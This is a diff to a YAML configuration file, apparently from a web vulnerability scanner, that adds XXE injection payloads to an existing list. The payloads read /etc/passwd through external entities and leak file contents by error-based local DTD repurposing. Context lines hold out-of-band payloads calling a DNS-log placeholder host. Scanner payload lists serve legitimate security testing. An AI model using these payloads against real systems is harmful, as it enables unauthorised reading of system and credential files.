@@ -247,6 +247,10 @@ application:
         - "<?xml version=\"1.0\"?><!DOCTYPE root[<!ENTITY % sp PUBLIC \"https://dnslog-url/xxe\">%sp;]>"
         - "<xs:schema elementFormDefault=\"qualified\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:myNS=\"myNS\"><xs:import namespace=\"myNS\" schemaLocation=\"https://dnslog-url/schema.xsd\"/><xs:include namespace=\"myNS2\" schemaLocation=\"https://dnslog-url/schema.xsd\"/></xs:schema>"
         - "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:import href=\"https://dnslog-url/index.xsl\"/><xsl:include href=\"https://dnslog-url/index.xsl\"/><xsl:value-of select=\"document('https://dnslog-url/test.txt')\" /></xsl:stylesheet>"
+        - "<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><name>&xxe;</name></root>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE message [<!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"><!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">&#x25;eval; &#x25;error;'>%NUMBER;]><message>any text</message>"
+        - "<!DOCTYPE message [\n    <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\">\n\n    <!ENTITY % CIMName '>\n        <!ENTITY &#x25; file SYSTEM \"file:///YOUR_FILE\">\n        <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>\">\n        &#x25;eval;\n        &#x25;error;\n        <!ELEMENT aa \"bb\"'>\n\n    %local_dtd;\n]>\n<message></message>"
+        - "<!DOCTYPE message [\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">\n    <!ENTITY % constant 'aaa)>\n        <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\n        <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>\">\n        &#x25;eval;\n        &#x25;error;\n        <!ELEMENT aa (bb'>\n\n    %local_dtd;\n]>\n<message></message>"
 
 # dnsLog模块
 dnsLogModule:
